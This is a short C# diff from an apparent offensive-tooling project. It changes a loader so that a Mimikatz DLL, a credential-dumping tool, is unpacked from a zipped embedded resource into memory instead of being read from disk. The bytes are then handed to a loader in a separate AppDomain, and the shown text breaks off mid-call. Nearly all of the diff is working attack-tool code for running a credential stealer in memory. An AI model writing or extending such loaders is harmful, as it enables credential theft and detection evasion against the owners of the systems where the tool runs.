@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Reflection;
 using System.Text;
@@ -47,7 +48,30 @@ namespace NewApproach
         {
             AppDomain ad = AppDomain.CreateDomain("Test");
             Console.WriteLine("new AppDomain \"Test\" was created");
-            byte[] mimi = loadFile(@"..\..\..\NonInteractiveMimikatz\bin\Debug\NonInteractiveMimikatz.dll");
+
+            Stream data = new MemoryStream(Properties.Resources.NonInteractiveMimikatz);
+            Stream unzippedEntryStream;  //Unzipped data from a file in the archive
+            ZipArchive archive = new ZipArchive(data);
+            byte[] mimi = new byte[0];
+
+            foreach (ZipArchiveEntry entry in archive.Entries)
+            {
+                Console.WriteLine(entry.FullName);
+                if (entry.FullName == @"NonInteractiveMimikatz.dll") //x64 Unpack And Execute
+                {
+                    //x64 Unpack And Execute
+                    Console.WriteLine(entry.FullName + " !! Gocha");
+                    unzippedEntryStream = entry.Open(); // .Open will return a stream
+                    using (var memoryStream = new MemoryStream())
+                    {
+                        unzippedEntryStream.CopyTo(memoryStream);
+                        mimi = memoryStream.ToArray();
+                    }                  
+
+                }                    
+            }
+
+            //byte[] mimi = loadFile(@"..\..\..\NonInteractiveMimikatz\bin\Debug\NonInteractiveMimikatz.dll");
 
             // Loader lives in another AppDomain
             Loader loader = (Loader)ad.CreateInstanceAndUnwrap(
